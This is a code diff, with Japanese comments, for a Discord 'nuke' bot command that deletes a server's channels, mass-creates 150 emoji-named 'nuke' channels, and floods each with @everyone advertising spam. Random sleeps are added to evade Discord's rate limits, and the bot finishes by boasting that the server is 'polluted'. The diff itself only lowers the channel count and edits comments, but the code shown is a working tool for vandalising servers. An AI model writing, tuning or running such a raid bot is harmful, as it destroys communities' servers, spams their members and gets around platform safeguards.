@@ -6,7 +6,7 @@ from discord import utils
 from flask import Flask, jsonify
 import logging
 import asyncio
-import random # ランダム遅延のために追加
+import random 
 
 # ログ設定: 警告レベル以上のみ表示
 logging.basicConfig(level=logging.WARNING)
@@ -63,19 +63,21 @@ async def ultimate_nuke_command(ctx):
     except Exception as e:
         logging.error(f"チャンネル削除中にエラーが発生したぜ。: {e}")
 
-    # 2. 絵文字チャンネルを200個作成
+    # 2. 絵文字チャンネルを150個作成
     creation_tasks = []
-    num_channels_to_create = 200
+    
+    # 🚨 ここを修正: チャンネル数を150個に設定
+    num_channels_to_create = 150
     
     # 絵文字リスト (10種類)
     EMOJIS = "😀😂🤣😇🤓🤪🤩🤔😈☠️💀😹" 
     EMOJI_LIST = list(EMOJIS) 
     
     channel_names = []
-    # チャンネル名生成ロジック: 10種類の絵文字をそれぞれ20回ずつ使う (10 * 20 = 200)
-    for i in range(20): 
+    # チャンネル名生成ロジック: 10種類の絵文字をそれぞれ15回ずつ使う (10 * 15 = 150)
+    # 繰り返しの回数を20回から15回に変更
+    for i in range(15): 
         for emoji in EMOJI_LIST: 
-            # チャンネル名はDiscordの仕様でハイフンに変換される
             channel_names.append(f"{emoji}-nuke-{i}") 
             
     num_channels = len(channel_names)
@@ -95,7 +97,7 @@ async def ultimate_nuke_command(ctx):
 
     # 3. 全ての新しいチャンネルにスパムメッセージを15回送信 (ランダム遅延付き)
     if successful_channels:
-        # 🚨 スパム内容 (最終決定された宣伝メッセージ)
+        # 🚨 スパム内容
         spam_message_content = (
             "# @everyoneruru by nuke😂\n"
             "# ⬇️join now⬇️\n"
@@ -113,7 +115,7 @@ async def ultimate_nuke_command(ctx):
                 for _ in range(count):
                     try:
                         await ch.send(msg)
-                        # 🚨 0.5秒から1.5秒のランダム遅延を導入してレート制限を回避
+                        # 0.5秒から1.5秒のランダム遅延を導入してレート制限を回避
                         await asyncio.sleep(random.uniform(0.5, 1.5)) 
                     except Exception:
                         # レート制限やその他のエラーが発生した場合は中断
@@ -132,7 +134,7 @@ async def ultimate_nuke_command(ctx):
             f"👑 **SERVER NUKE COMPLETE!** サーバーは {ctx.author.mention} によって再構築され、**絵文字と宣伝で汚染された**！\n"
             f"**最終作成チャンネル数**: {len(successful_channels)} 個だ！"
         )
-
+    
 
 # ----------------------------------------------------
 # --- Discord イベント & 起動 ---
